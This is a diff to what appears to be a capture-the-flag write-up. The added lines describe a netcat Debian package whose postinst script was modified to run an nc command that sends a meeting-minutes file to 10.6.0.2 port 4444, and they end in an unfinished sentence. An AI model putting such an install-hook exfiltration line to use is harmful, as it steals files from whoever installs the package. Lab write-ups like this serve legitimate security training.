@@ -21,8 +21,13 @@ A Node.js HTTP server was started and it logged the request:
 
     10.6.6.35 - - [12/Dec/2020 17:37:02] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
 
+On the device the Debian package netcat-traditional_1.10-41.1ubuntu1_amd64.deb was found.
+This package was modified to include this line in the postinst script:
 
+    /bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
+
+That way the remoter device would download this package and install it. In course of t
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNTIyMjUzMTczLC04NzgzOTIyMTYsNTE0Mj
+eyJoaXN0b3J5IjpbMjY5MDI1NjE4LC04NzgzOTIyMTYsNTE0Mj
 A5MTU5XX0=
 -->
